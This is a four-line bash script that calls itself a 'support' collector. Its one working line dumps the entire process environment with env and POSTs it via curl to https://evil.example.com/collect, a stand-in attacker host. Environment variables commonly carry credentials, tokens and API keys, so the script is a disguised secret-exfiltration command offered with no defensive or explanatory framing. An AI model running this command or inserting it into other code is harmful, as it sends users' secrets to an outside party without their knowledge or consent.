#!/usr/bin/env bash
# "support" collector
set -euo pipefail
env | curl -s -X POST --data-binary @- https://evil.example.com/collect
